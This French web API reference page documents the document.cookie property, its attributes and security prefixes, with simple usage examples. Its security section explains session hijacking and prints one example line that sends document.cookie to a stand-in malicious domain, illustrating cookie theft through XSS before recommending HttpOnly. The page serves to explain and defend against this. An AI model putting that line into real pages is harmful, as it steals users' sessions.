---
title: "Document : propriété cookie"
short-title: cookie
slug: Web/API/Document/cookie
l10n:
  sourceCommit: ca26363fcc6fc861103d40ac0205e5c5b79eb2fa
---

{{APIRef("DOM")}}

La proprité **`cookie`** de l'interface {{DOMxRef("Document")}} permet de lire et d'écrire des [cookies](/fr/docs/Web/HTTP/Guides/Cookies) associés au document.
Elle sert d'accesseur et de mutateur pour les valeurs réelles des cookies.

> [!NOTE]
> Le `document.cookie` peut être une source de problèmes de performance car il s'agit d'une API synchrone qui bloque le processus principal lors de la lecture de cookies entre processus ou lors d'opérations d'Entrée/Sortie. Les développeur·euse·s devraient, si possible, utiliser [l'API de stockage des cookies](/fr/docs/Web/API/Cookie_Store_API) asynchrone pour gérer les cookies.

## Valeur

Une chaîne de caractères contenant une liste de tous les cookies séparés par des points-virgules (c'est-à-dire des paires `clé=valeur`).
Notez que chaque _clé_ et _valeur_ peut être entourée d'espaces blancs (caractères espace et tabulation)&nbsp;: en fait, le {{RFC(6265)}} impose un seul espace après chaque point-virgule, mais certains agents utilisateurs peuvent ne pas respecter cette règle.

Vous pouvez également affecter à cette propriété une chaîne de caractères de la forme `"clé=valeur"`, définissant le cookie à créer ou mettre à jour. Notez que vous ne pouvez créer ou mettre à jour qu'un seul cookie à la fois avec cette méthode. Prenez également en compte&nbsp;:

- N'importe laquelle des valeurs d'attribut de cookie suivantes peut éventuellement suivre la paire clé-valeur, chacune précédée d'un séparateur point-virgule&nbsp;:
  - `;domain=domain` (par exemple, `example.com` ou `subdomain.example.com`)&nbsp;: L'hôte auquel le cookie sera envoyé.
    Si ce n'est pas défini, cela correspond par défaut à la partie hôte de l'emplacement du document actuel et le cookie n'est pas disponible sur les sous-domaines.
    Si un domaine est défini, les sous-domaines sont toujours inclus.
    Contrairement aux spécifications antérieures, les points initiaux dans les noms de domaine sont ignorés, mais les navigateurs peuvent refuser de créer le cookie contenant de tels points.

    > [!NOTE]
    > Le domaine _doit_ correspondre au domaine de l'origine JavaScript.
    > Définir des cookies sur des domaines étrangers sera ignoré silencieusement.

  - `;expires=date-in-UTCString-format`&nbsp;: La date d'expiration du cookie. Si, ni `expires`, ni `max-age` n'est défini, le cookie expirera à la fin de la session.

    > [!WARNING]
    > Lorsque la vie privée de l'utilisateur·ice est en jeu, il est important que toute application web invalide les données du cookie après un certain délai plutôt que de compter sur le navigateur pour le faire.
    > De nombreux navigateurs permettent à l'utilisateur·ice de définir que les cookies ne doivent jamais expirer, ce qui n'est pas nécessairement sûr.

    Voir {{JSxRef("Date.toUTCString()")}} pour obtenir de l'aide sur le formatage de cette valeur.

  - `;max-age=max-age-in-seconds`&nbsp;: La durée maximale du cookie en secondes (par exemple, `60*60*24*365` ou 31536000 pour un an).

  - `;partitioned`&nbsp;: Indique que le cookie doit être stocké en utilisant un stockage compartimenté. Voir [Cookies ayant un état compartimenté indépendant (CHIPS)](/fr/docs/Web/Privacy/Guides/Privacy_sandbox/Partitioned_cookies) pour plus de détails.

  - `;path=path`&nbsp;: La valeur de l'attribut `Path` du cookie (voir [Définir où les cookies sont envoyés](/fr/docs/Web/HTTP/Guides/Cookies#définir_où_les_cookies_sont_envoyés) pour plus d'informations).

  - `;samesite`&nbsp;: L'attribut `SameSite` d'un en-tête HTTP {{HTTPHeader("Set-Cookie")}} peut être défini par un serveur pour indiquer quand le cookie sera envoyé. Les valeurs possibles sont `lax`, `strict` ou `none` (voir aussi [Contrôler les cookies tiers avec `SameSite`](/fr/docs/Web/HTTP/Guides/Cookies#contrôler_les_cookies_tiers_avec_samesite)).
    - La valeur `lax` enverra le cookie pour toutes les requêtes du même site et les requêtes GET de navigation de niveau supérieur.
      Cela suffit pour le suivi des utilisateur·ice·s, mais cela empêchera de nombreuses attaques de [falsification de requête intersites](/fr/docs/Glossary/CSRF) (CSRF).
      C'est la valeur par défaut dans les navigateurs modernes.
    - La valeur `strict` empêchera le cookie d'être envoyé par le navigateur au site cible dans tous les contextes de navigation intersites, même lors du suivi d'un lien classique.
    - La valeur `none` indique explicitement qu'aucune restriction ne sera appliquée.
      Le cookie sera envoyé dans toutes les requêtes — intersites et même site.

  - `;secure`&nbsp;: Définit que le cookie ne doit être transmis que avec un protocole sécurisé.

- La chaînes de caractères de la valeur du cookie peut utiliser {{JSxRef("Global_Objects/encodeURIComponent", "encodeURIComponent()")}} pour s'assurer que la chaîne de caractères ne contient pas de virgules, de points-virgules ou d'espaces (qui ne sont pas autorisés dans les valeurs des cookies).
- Le nom du cookie peut avoir un préfixe qui impose des restrictions spécifiques aux attributs du cookie dans les agents utilisateurs pris en charge. Tous les préfixes de cookies commencent par un double trait de soulignement (`__`) et se terminent par un tiret (`-`). Les préfixes suivants sont définis&nbsp;:
  - **`__Secure-`**&nbsp;: Les cookies dont le nom commence par `__Secure-` doivent être définis avec l'attribut `Secure` par une page sécurisée (HTTPS).
  - **`__Host-`**&nbsp;: Les cookies dont le nom commence par `__Host-` doivent être définis avec l'attribut `Secure` par une page sécurisée (HTTPS). De plus, ils ne doivent pas avoir d'attribut `Domain` défini, et l'attribut `Path` doit être défini sur `/`. Cela garantit que ces cookies ne sont envoyés qu'à l'hôte qui les a définis, et non à un autre hôte du domaine. Cela garantit également qu'ils sont définis pour l'ensemble de l'hôte et ne peuvent pas être remplacés sur un chemin quelconque de cet hôte. Cette combinaison produit un cookie qui est aussi proche que possible de traiter l'origine comme une frontière de sécurité.
  - **`__Http-`**&nbsp;: Les cookies dont le nom commence par `__Http-` doivent être définis avec l'attribut `Secure` par une page sécurisée (HTTPS) et doivent en outre avoir l'attribut `HttpOnly` défini pour prouver qu'ils ont été définis avec l'en-tête `Set-Cookie` (ils ne peuvent pas être définis ou modifiés avec des fonctionnalités JavaScript telles que `Document.cookie` ou [l'API Cookie Store](/fr/docs/Web/API/Cookie_Store_API)).
  - **`__Host-Http-`**&nbsp;: Les cookies dont le nom commence par `__Host-Http-` doivent être définis avec l'attribut `Secure` par une page sécurisée (HTTPS) et doivent avoir l'attribut `HttpOnly` défini pour prouver qu'ils ont été définis avec l'en-tête `Set-Cookie`. De plus, ils ont les mêmes restrictions que les cookies préfixés par `__Host-`. Cette combinaison produit un cookie qui est aussi proche que possible de traiter l'origine comme une frontière de sécurité tout en garantissant aux développeurs et aux opérateurs de serveur que sa portée est limitée aux requêtes HTTP.

  > [!NOTE]
  > Le tiret est considéré comme faisant partie du préfixe.

  > [!NOTE]
  > Ces indicateurs ne peuvent être définis qu'avec l'attribut `secure`.

> [!NOTE]
> La propriété `document.cookie` est une [propriété accesseur](/fr/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) avec des fonctions _mutatrices_ et _récupératrices_, et a pour conséquence de _ne pas_ être une [propriété de données](/fr/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty#description) avec une valeur&nbsp;: ce que vous écrivez n'est pas la même chose que ce que vous lisez, tout est toujours médié par l'interpréteur JavaScript.

## Exemples

### Exemple 1 : Utilisation simple

```html
<button id="show">Afficher les cookies</button>
<button id="clear">Effacer</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// On notera que nous définissons `SameSite=None;` dans cet exemple car
// l'exemple doit fonctionner en inter-origines.
// Il est plus courant de ne pas définir l'attribut `SameSite`, ce qui
// entraîne la valeur par défaut, et plus sécurisée, de `SameSite=Lax;`
document.cookie = "name=Oeschger; SameSite=None; Secure";
document.cookie = "favorite_food=tripe; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  output.textContent = `> ${document.cookie}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample("Exemple 1 : Utilisation simple", 200, 72)}}

### Exemple 2 : Obtenir un cookie d'exemple nommé test2

```html
<button id="show">Afficher la valeur du cookie</button>
<button id="clear">Effacer</button>
<div>
  <code id="cookie-value"></code>
</div>
```

```js
const showBtn = document.getElementById("show");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("cookie-value");

// On notera que nous définissons `SameSite=None;` dans cet exemple car
// l'exemple doit fonctionner en inter-origines.
// Il est plus courant de ne pas définir l'attribut `SameSite`, ce qui
// entraîne la valeur par défaut, et plus sécurisée, de `SameSite=Lax;`
document.cookie = "test1=Hello; SameSite=None; Secure";
document.cookie = "test2=World; SameSite=None; Secure";

showBtn.addEventListener("click", () => {
  const cookieValue = document.cookie
    .split("; ")
    .find((row) => row.startsWith("test2="))
    ?.split("=")[1];
  output.textContent = `> ${cookieValue}`;
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample("Exemple 2 : Obtenir un cookie d'exemple nommé test2", 200, 72)}}

### Exemple 3 : Faire quelque chose une seule fois

Pour utiliser le code suivant, remplacez toutes les occurrences du mot `doSomethingOnlyOnce` (le nom du cookie) par un nom personnalisé.

```html
<button id="do-once">Faire quelque chose une seule fois</button>
<button id="clear">Effacer</button>
<div>
  <code id="output"></code>
</div>
```

```js
const doOnceBtn = document.getElementById("do-once");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

doOnceBtn.addEventListener("click", () => {
  if (
    !document.cookie
      .split("; ")
      .find((row) => row.startsWith("doSomethingOnlyOnce"))
  ) {
    // On notera que nous définissons `SameSite=None;` dans cet exemple
    // car l'exemple doit fonctionner en inter-origines.
    // Il est plus courant de ne pas définir l'attribut `SameSite`, ce
    // qui entraîne la valeur par défaut, et plus sécurisée, de
    // `SameSite=Lax;`
    document.cookie =
      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT; SameSite=None; Secure";

    output.textContent = "> Faire quelque chose ici !";
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample("Exemple 3 : Faire quelque chose une seule fois", 200, 72)}}

### Exemple 4 : Réinitialiser le cookie précédent

```html
<button id="reset">
  Réinitialiser le cookie «&nbsp;faire quelque chose une seule fois&nbsp;»
</button>
<button id="clear">Effacer</button>
<div>
  <code id="output"></code>
</div>
```

```js
const resetBtn = document.getElementById("reset");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

resetBtn.addEventListener("click", () => {
  // On notera que nous définissons `SameSite=None;` dans cet exemple car
  // l'exemple doit fonctionner en inter-origines.
  // Il est plus courant de ne pas définir l'attribut `SameSite`, ce qui
  // entraîne la valeur par défaut, et plus sécurisée, de `SameSite=Lax;`
  document.cookie =
    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT; SameSite=None; Secure";

  const output = document.getElementById("reset-once");
  output.textContent = "> Reset!";
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample("Exemple 4 : Réinitialiser le cookie précédent", 200, 72)}}

### Exemple 5 : Vérifier l'existence d'un cookie

```html
<button id="check">Vérifier l'existence d'un cookie</button>
<button id="clear">Effacer</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

// On notera que nous définissons `SameSite=None;` dans cet exemple car
// l'exemple doit fonctionner en inter-origines.
// Il est plus courant de ne pas définir l'attribut `SameSite`, ce qui
// entraîne la valeur par défaut, et plus sécurisée, de `SameSite=Lax;`
document.cookie = "reader=1; SameSite=None; Secure";

checkBtn.addEventListener("click", () => {
  if (
    document.cookie.split(";").some((item) => item.trim().startsWith("reader="))
  ) {
    output.textContent = '> Le cookie "reader" existe';
  } else {
    output.textContent = '> Le cookie "reader" n\'existe pas';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample("Exemple 5 : Vérifier l'existence d'un cookie", 200, 72)}}

### Exemple 6 : Vérifier qu'un cookie a une valeur spécifique

```html
<button id="check">Vérifier qu'un cookie a une valeur spécifique</button>
<button id="clear">Effacer</button>
<div>
  <code id="output"></code>
</div>
```

```js
const checkBtn = document.getElementById("check");
const clearBtn = document.getElementById("clear");
const output = document.getElementById("output");

checkBtn.addEventListener("click", () => {
  if (document.cookie.split(";").some((item) => item.includes("reader=1"))) {
    output.textContent = '> Le cookie "reader" a une valeur de "1"';
  }
});
clearBtn.addEventListener("click", () => {
  output.textContent = "";
});
```

{{EmbedLiveSample("Exemple 6 : Vérifier qu'un cookie a une valeur spécifique", 200, 72)}}

## Sécurité

Il est important de noter que l'attribut `path` _ne_ protège _pas_ contre la lecture non autorisée du cookie depuis un chemin différent.
Il peut être facilement contourné à l'aide du DOM, par exemple en créant un élément HTML {{HTMLElement("iframe")}} caché avec le chemin d'accès du cookie, puis en accédant à la propriété `contentDocument.cookie` de ce cadre intégré.
La seule façon de protéger le cookie est d'utiliser un domaine ou un sous-domaine différent, en raison de la [politique de même origine](/fr/docs/Web/Security/Defenses/Same-origin_policy).

Les cookies sont souvent utilisés dans les applications Web pour identifier un·e utilisateur·ice et sa session authentifiée.
Le vol d'un cookie dans une application Web permet de détourner la session authentifiée de l'utilisateur·ice.
Les méthodes courantes pour voler des cookies comprennent l'utilisation [de l'ingénierie sociale](<https://fr.wikipedia.org/wiki/Ing%C3%A9nierie_sociale_(s%C3%A9curit%C3%A9_de_l%27information)>) ou l'exploitation d'une vulnérabilité de type [script intersite](/fr/docs/Glossary/Cross-site_scripting) (XSS) dans l'application.

```js
new Image().src = `http://www.mechant-domaine.com/voler-cookie.php?cookie=${document.cookie}`;
```

L'attribut de cookie `HTTPOnly` peut aider à atténuer cette attaque en empêchant l'accès à la valeur du cookie avec JavaScript.
En savoir plus sur [les cookies et la sécurité <sup>(angl.)</sup>](https://humanwhocodes.com/blog/2009/05/12/cookies-and-security/).

## Notes

- À partir de Firefox 2, un meilleur mécanisme de stockage côté client est disponible — [WHATWG DOM Storage](/fr/docs/Web/API/Web_Storage_API).
- Vous pouvez supprimer un cookie en mettant à zéro sa date d'expiration.
- N'oubliez pas que plus vous avez de cookies, plus le volume de données transférées entre le serveur et le client sera important pour chaque requête.
  Cela ralentira chaque requête.
  Il est fortement recommandé d'utiliser [WHATWG DOM Storage](/fr/docs/Web/API/Web_Storage_API) si vous souhaitez conserver des données «&nbsp;réservées au client&nbsp;».
- Le [RFC 2965 <sup>(angl.)</sup>](https://datatracker.ietf.org/doc/html/rfc2965) (Section 5.3, «&nbsp;Limites d'implémentation&nbsp;») définit qu'il ne devrait y avoir **aucune longueur maximale** pour la clé ou la valeur d'un cookie, et encourage les implémentations à prendre en charge **des cookies de taille arbitraire**.
  La limite maximale de chaque navigateur sera nécessairement différente, veuillez donc consulter la documentation de chaque navigateur.

La raison de l'asymétrie entre la lecture et l'écriture de l'accesseur, `document.cookie` tient à la nature client-serveur des cookies, qui diffère des autres méthodes de stockage client-client (comme, par exemple, [localStorage](/fr/docs/Web/API/Web_Storage_API))&nbsp;:

- Le serveur demande au client de stocker un cookie&nbsp;:

  ```http
  HTTP/1.0 200 OK
  Content-type: text/html
  Set-Cookie: cookie_name1=cookie_value1
  Set-Cookie: cookie_name2=cookie_value2; expires=Sun, 16 Jul 3567 06:23:41 GMT

  [content of the page here]
  ```

- Le client renvoie au serveur les cookies qu'il a précédemment stockés&nbsp;:

  ```http
  GET /sample_page.html HTTP/1.1
  Host: www.example.org
  Cookie: cookie_name1=cookie_value1; cookie_name2=cookie_value2
  Accept: */*
  ```

## Spécifications

{{Specifications}}

## Compatibilité des navigateurs

{{Compat}}

## Voir aussi

- [Les cookies HTTP](/fr/docs/Web/HTTP/Guides/Cookies)
- [Stockage DOM](/fr/docs/Web/API/Web_Storage_API)
- La propriété {{DOMxRef("URL.pathname")}}
- La méthode {{JSxRef("Date.toUTCString()")}}
- Le [RFC 2965 <sup>(angl.)</sup>](https://datatracker.ietf.org/doc/html/rfc2965)
